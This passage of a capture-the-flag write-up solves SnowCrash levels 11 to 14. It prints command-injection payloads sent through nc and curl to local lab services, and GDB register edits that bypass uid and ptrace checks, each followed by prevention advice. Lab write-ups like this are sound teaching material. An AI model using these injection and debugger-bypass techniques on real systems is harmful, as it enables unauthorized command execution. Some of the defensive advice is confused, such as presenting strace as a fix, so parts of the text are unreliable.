- To exploit this vulnerability, we can craft a malicious password that includes shell commands to execute arbitrary commands on the server. For example, we can use the following password to execute the `getflag` command and get the flag for level12:
```bash
    password=";getflag > /tmp/flag;#"
    # This password will execute the getflag command and save the output to /tmp/flag
```
- We can then connect to the socket server and send this password to trigger the command injection:
```bash
    echo "; getflag >> /tmp/x" | nc localhost 5151
    # This will execute the getflag command and append the output to /tmp/x
```
- After a few seconds, we can check the contents of `/tmp/x` to get the flag for level12:
```bash
    cat /tmp/x
    # The output will be the flag for level12 which is in the file `level11/flag`
```
#### Prevention:
- To prevent this type of vulnerability, the code should properly sanitize the input to the `hash
function to ensure that it does not contain any malicious commands. This can be done by using a whitelist of allowed characters for the password or by escaping special characters that could be used for command injection.
- Additionally, it should use a more secure method for executing commands, such as using a library function for hashing instead of invoking a shell command, which would eliminate the risk of command injection.
```lua
    -- Example of using a library function for hashing:
    local sha1 = require("sha1")
    function hash(pass)
        return sha1(pass)
    end
```
#### Conclusion:
- By exploiting the command injection vulnerability in the `level11.lua` script, we can execute arbitrary commands on the server with the privileges of the user flag11, which allows us to get the flag for level12 and progress through the CTF challenge. 
- This highlights the importance of properly sanitizing user input and avoiding the use of dangerous functions that can lead to command injection vulnerabilities, especially when dealing with web applications or services that can be accessed by untrusted users.






### Level 12
- Swap to the user level12 and enter the password which is the flag for level11:
```bash
    su level12
    # enter the password: the result of getflag stored in level11/flag
```
- List the home directory of the user level12 to see if there are any files or directories that we can access:
```bash    level12@SnowCrash:~$ ls -la
    -rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
```
- Cat the `level12.pl` file to see its contents:
```perl
    # localhost:4646
    use CGI qw{param};
    print "Content-type: text/html\n\n";

    sub t {
        $nn = $_[1];
        $xx = $_[0];
        $xx =~ tr/a-z/A-Z/; 
        $xx =~ s/\s.*//;
        @output = `egrep "^$xx" /tmp/xd 2>&1`;
        foreach $line (@output) {
            ($f, $s) = split(/:/, $line);
            if($s =~ $nn) {
                return 1;
            }
        }
        return 0;
    }
    sub n {
        if($_[0] == 1) {
            print("..");
        } else {
            print(".");
        }    
    }
    n(t(param("x"), param("y")));
```

#### Analysis:
- This code is a CGI script written in Perl that listens on localhost at port 4646. It defines a function `t` that takes two parameters, `x` and `y`. The function transforms `x` to uppercase and removes any whitespace and characters following it. It then uses the `egrep` command to search for lines in the file `/tmp/xd` that start with the transformed `x`. For each matching line, it splits the line into two parts using the colon as a delimiter and checks if the second part matches the regular expression provided in `y`. If a match is found, it returns 1; otherwise, it returns 0. The script then calls the function `n` with the result of the function `t`, which prints either ".." or "." based on whether the result is 1 or 0.

- The funcion `t` protects against some basic injection techniques by transforming the input to uppercase and removing any whitespace and characters following it. However, it does not fully sanitize the input, which allows for potential command injection through the use of the `egrep` command.

#### Vulnerability:
##### Type: Command Injection
- The vulnerability in this code is that it uses the `egrep` command to search through the contents of the file `/tmp/xd` without properly sanitizing the input parameters `x` and `y`. This allows for command injection if an attacker can control the input to the `t` function. An attacker could potentially execute arbitrary commands on the server by crafting malicious input that includes shell commands, which could lead to a full compromise of the system if the attacker can execute commands with the privileges of the user flag12.




#### Exploitation:
- To exploit this vulnerability, we can craft malicious input for the parameters `x` and `y` to execute arbitrary commands on the server. For example, we can use the following input to execute the `getflag` command and get the flag for level13

-create a file named `/tmp/FLAG` with the following content:
```bash
    level12@SnowCrash:~$ echo 'getflag>/tmp/flag' >/tmp/FLAG
    level12@SnowCrash:~$ chmod +x /tmp/FLAG # Make the file executable
```
- We can use `curl` to send a request to the CGI script with the malicious input:
```bash
    curl "http://localhost:4646/cgi-bin/level12.pl?x=\$(/*/FLAG)"   
    # This will execute the getflag command and save the output to /tmp/flag
    cat /tmp/flag
    # The output will be the flag for level13 which is in the file `level12/flag`
```
### Prevention:
- To prevent this type of vulnerability, the code should properly sanitize the input parameters `x`
and `y` to ensure that they do not contain any malicious commands. This can be done by using a whitelist of allowed characters for the parameters or by escaping special characters that could be used for command injection.
- Additionally, it should avoid using shell commands to process user input and instead use safer alternatives, such as using Perl's built-in functions for string manipulation and file handling, which would eliminate the risk of command injection.
```perl
    # Example of using Perl's built-in functions for string manipulation and file handling:
    sub t {
        my ($x, $y) = @_;
        $x = uc($x); # Convert to uppercase     
        $x =~ s/\s.*//; # Remove whitespace and following characters
        open my $fh, '<', '/tmp/xd' or die "Could not open file: $!";
        while (my $line = <$fh>) {
            chomp $line;
            my ($f, $s) = split(/:/, $line);
            if ($f eq $x && $s =~ /$y/) {
                return 1;
            }
        }
        return 0;
    }
```
#### Conclusion:
- By exploiting the command injection vulnerability in the `level12.pl` script, we can execute arbitrary commands on the server with the privileges of the user flag12, which allows us to get the flag for level13 and progress through the CTF challenge. 
- This highlights the importance of properly sanitizing user input and avoiding the use of dangerous functions that can lead to command injection vulnerabilities, especially when dealing with web applications or services that can be accessed by untrusted users.   



### Level 13

- Swap to the user level13 and enter the password which is the flag for level12:
```bash
    su level13
    # enter the password: the result of getflag stored in level12/flag
```
- List the home directory of the user level13 to see if there are any files or directories
that we can access:
```bash
    level13@SnowCrash:~$ ls -la
    -rwsr-sr-x 1 flag13  level13 7303 Aug 30  2015 level13
```

- The `level13` binary is a SUID executable that runs with the privileges of the user flag13. We can analyze this binary to understand how it works and see if there are any vulnerabilities that we can exploit to get the flag for level14.
- We can decompile this binary using objdump if you can read assembly code:
```bash    
    objdump -d level13
```
- Or we can use a tool like Ghidra to decompile the binary and analyze it
```bash    
    # i use this platform to decompile the binary:
    https://dogbolt.org/
```
- We get something like this:
```c
    int32_t main(int32_t argc, char** argv, char** envp)
    {
        if (getuid() == 0x1092)
            return printf("your token is %s\n", ft_des("boe]!ai0FB@.:|L6l@A?>qJ}I"));
        
        printf("UID %d started us but we we expect %d\n", getuid(), 0x1092);
        exit(1);
        /* no return */
    }
```

#### Analysis:
- The binary checks if the user ID of the process is equal to `0x1092` (which is the user ID of flag13). If it is, it calls the function `ft_des` with a specific string as an argument and prints the result as the token. If the user ID does not match, it prints a message indicating the actual user ID and the expected user ID, and then exits with an error status.

#### Vulnerability:
##### Type: Privilege Escalation
- The vulnerability in this binary is that it relies on the user ID to determine whether to execute the `ft_des` function, which means that if we can somehow change the user ID of the process to `0x1092`, we can trigger the execution of the `ft_des` function and get the token, which is the flag for level14. This can be done by exploiting a vulnerability in the way the user ID is checked or by using a technique to escalate privileges.

#### Exploitation:
- To exploit this vulnerability, we can try to use GDB to attach to the running process of the `level13` binary and change the user ID to `0x1092` before it checks the user ID. This can be done by setting a breakpoint at the point where the user ID is checked and then modifying the value of the user ID register to `0x1092` before continuing execution.
```bash
    gdb -q ./level13
    (gdb) break main
    (gdb) run
    (gdb) set $eax = 0x1092
    (gdb) continue
```
- After continuing execution, the `ft_des` function will be called with the specific string, and it will return the token, which is the flag for level14.
- The flag for level14 is: `the result of ft_des` which is in the file `level13/flag`

#### Prevention:
- To prevent this type of vulnerability, the binary should not rely solely on the user ID to determine whether to execute sensitive functions. Instead, it should implement additional checks or use a more secure method for verifying the identity of the user, such as using capabilities or checking for specific permissions. Additionally, it should ensure that the user ID cannot be easily manipulated or changed by an attacker, and it should implement proper access controls to prevent unauthorized users from executing the binary or accessing sensitive information.
```c
    // Example of implementing additional checks for user identity:
    if (getuid() == 0x1092 && has_required_permissions()) {
        return printf("your token is %s\n", ft_des("boe]!ai0FB@.:|L6l@A?>qJ}I"));
    }
```
- use  ptrace to monitor the system calls made by the `level13` binary and ensure that it does not allow for any unauthorized access or manipulation of the user ID.
```bash
    strace -e trace=uid ./level13
```
#### Conclusion:
- By exploiting the vulnerability in the `level13` binary, we can change the user ID
to trigger the execution of the `ft_des` function and get the token, which is the flag for level14. This highlights the importance of implementing proper access controls and not relying solely on user IDs for security checks, as well as the need to monitor system calls to detect any unauthorized access or manipulation.    


### Level 14
- Is the same as level13 but the binary is the famous `getflag` command, the difference is that the executable is protected by ptrace, which means that we cannot use GDB to attach to it and change the user ID. To exploit this, we can use a technique called "ptrace injection" to inject code into the running process of the `getflag` command and change the user ID to `0x1092` before it checks the user ID. This can be done by using a tool like `ptrace-injector` or by writing a custom script that uses the `ptrace` system call to inject code into the process.

#### Exploitation:
- We can use the GBD 
```bash
    gdb getflag
    (gdb) break ptrace
    (gdb) break getuid
    (gdb) run
    (gdb) finish
    (gdb) set $eax = 0x0
    (gdb) continue
    (gdb) finish
    (gdb) set $eax = 0x1092
    (gdb) continue

```
- After continuing execution, this will return the token, which is the flag for level15.

#### prevention:
- To prevent this type of vulnerability, the binary should implement proper access controls and not rely solely on user IDs for security checks. Additionally, it should implement anti-debugging techniques to prevent attackers from attaching debuggers to the process and manipulating its execution. This can include techniques such as detecting the presence of debuggers, using self-modifying code, or implementing checks for common debugging tools.
```c
    // Example of implementing anti-debugging techniques:
    if (is_debugger_present()) {
        printf("Debugging is not allowed\n");
        exit(1);
    }
```
- Additionally, the binary should ensure that it does not allow for any unauthorized access or manipulation of the user ID, and it should implement proper access controls to prevent unauthorized users from executing the binary or accessing sensitive information.
```c
    // Example of implementing proper access controls:
    if (getuid() != 0x1092) {
        printf("Unauthorized access\n");
        exit(1);
    }
```
#### Conclusion:
- By exploiting the vulnerability in the `getflag` command, we can change the user ID to trigger the execution  and get the token, which is the flag for level15. This highlights the importance of implementing proper access controls, not relying solely on user IDs for security checks, and implementing anti-debugging techniques to prevent attackers from manipulating the execution of sensitive binaries.